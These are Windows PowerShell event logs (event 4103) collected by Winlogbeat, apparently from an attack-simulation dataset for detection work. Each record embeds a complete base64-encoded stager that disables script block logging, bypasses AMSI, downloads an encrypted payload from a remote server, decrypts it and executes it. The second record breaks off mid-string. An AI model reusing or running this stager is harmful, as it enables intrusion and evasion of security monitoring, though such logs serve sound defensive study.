{"@timestamp":"2019-05-18T20:43:13.205Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"host":{"name":"WECserver"},"log_name":"Microsoft-Windows-PowerShell/Operational","record_number":"92786","thread_id":5812,"type":"wineventlog","task":"Executing Pipeline","process_id":5172,"version":1,"user":{"identifier":"S-1-5-21-2511471446-1103646877-3980648787-1106","name":"nmartha","domain":"SHIRE","type":"User"},"computer_name":"HR001.shire.com","event_data":{"ContextInfo":"        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 9189b674-b66f-4ae4-af64-65d46d4e78e4\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAGUAbQAuAFQAZQB4AFQALgBFAG4AYwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQARQBTACgAJwB+AGsAKgBfAEYAUwBqAHIAOAAlAHgAdwBlAEoANgBoAHwAUABLAC4AZgB7AFUATgBNAEgAdQBkAHAANQB5AG0AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQB0AFMAdAByAGkATgBHACgAWwBDAE8ATgB2AGUAcgBUAF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQARQBBAE0AQQBBAHUAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAeABBAEQAQQBBAE4AZwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQANAAzAEUAZgAzAC4ASABlAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AHoAbwBqADAAdgBDAE0ATwBsAFYAZQByADIARgBJAFMAZgBpAEYAawBSAEMAagBsAHIAOABjAD0AIgApADsAJABEAGEAVABhAD0AJAA0ADMARQBmADMALgBEAE8AdwBuAGwAbwBBAEQARABBAFQAYQAoACQAUwBlAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABkAEEAVABBAFsANAAuAC4AJABkAEEAdABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\n        Engine Version = 5.1.17763.316\n        Runspace ID = af4eb08f-cf11-45ec-bcd4-8f4fd11c1776\n        Pipeline ID = 1\n        Command Name = ForEach-Object\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 69923\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell","Payload":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$508c.Headers.Add($_.Name, $_.Value)\""},"message":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$508c.Headers.Add($_.Name, $_.Value)\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 9189b674-b66f-4ae4-af64-65d46d4e78e4\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAGUAbQAuAFQAZQB4AFQALgBFAG4AYwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQARQBTACgAJwB+AGsAKgBfAEYAUwBqAHIAOAAlAHgAdwBlAEoANgBoAHwAUABLAC4AZgB7AFUATgBNAEgAdQBkAHAANQB5AG0AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQB0AFMAdAByAGkATgBHACgAWwBDAE8ATgB2AGUAcgBUAF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQARQBBAE0AQQBBAHUAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAeABBAEQAQQBBAE4AZwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQANAAzAEUAZgAzAC4ASABlAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AHoAbwBqADAAdgBDAE0ATwBsAFYAZQByADIARgBJAFMAZgBpAEYAawBSAEMAagBsAHIAOABjAD0AIgApADsAJABEAGEAVABhAD0AJAA0ADMARQBmADMALgBEAE8AdwBuAGwAbwBBAEQARABBAFQAYQAoACQAUwBlAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABkAEEAVABBAFsANAAuAC4AJABkAEEAdABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\n        Engine Version = 5.1.17763.316\n        Runspace ID = af4eb08f-cf11-45ec-bcd4-8f4fd11c1776\n        Pipeline ID = 1\n        Command Name = ForEach-Object\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 69923\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"source_name":"Microsoft-Windows-PowerShell","opcode":"To be used when operation is just executing a method","provider_guid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","activity_id":"{c93a7728-017f-0000-ad03-4aca7f01d501}","event_id":4103,"level":"Information"}
{"@timestamp":"2019-05-18T20:43:13.206Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"event_data":{"ContextInfo":"        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 9189b674-b66f-4ae4-af64-65d46d4e78e4\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAP